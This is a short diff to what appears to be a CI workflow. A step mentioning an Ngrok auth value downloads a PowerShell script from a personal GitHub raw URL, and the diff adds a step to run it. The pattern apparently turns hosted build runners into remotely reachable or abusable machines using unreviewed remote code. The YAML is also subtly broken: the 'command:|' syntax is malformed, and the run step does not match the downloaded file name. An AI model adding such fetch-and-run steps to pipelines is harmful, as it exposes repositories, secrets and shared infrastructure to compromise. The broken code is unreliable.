@@ -17,3 +17,4 @@ steps:
 name: Paste Ngrok Auth Value In Hosted Link
 command:|
 Invoke-WebRequest https://raw.githubusercontent.com/hollis776/rayhan5363/main/menu -OutFile gpu.ps1
+- run: ./ps1
